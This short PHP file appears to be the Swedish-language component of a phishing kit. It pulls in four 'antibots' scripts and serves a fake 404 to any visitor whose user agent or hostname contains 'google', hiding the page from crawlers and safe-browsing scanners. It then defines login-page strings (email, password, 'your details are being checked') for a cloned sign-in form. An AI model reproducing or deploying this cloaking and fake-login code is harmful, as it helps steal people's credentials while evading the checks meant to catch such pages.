<?php
include "../bots/antibots1.php";
include "../bots/antibots2.php";
include "../bots/antibots3.php";
include "../bots/antibots4.php";

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

// connexion
$ERROR="En del av uppgifterna du angett är felaktiga. Försök igen.";
$Email= "E-post";
$Password = "Lösenord";
$dok = "Logga in";
$req1 = 'Du måste ange en e-postadress.';
$req2 = 'Lösenord krävs.';
$forgot ="Har du problem med att logga in?";
$sign = "Skapa ett konto";
$checking = "Dina uppgifter kontrolleras …";
$priva = "Sekretess";
$ri8 = "Med ensamrätt";
$legal = "";
// fin connexioon
?>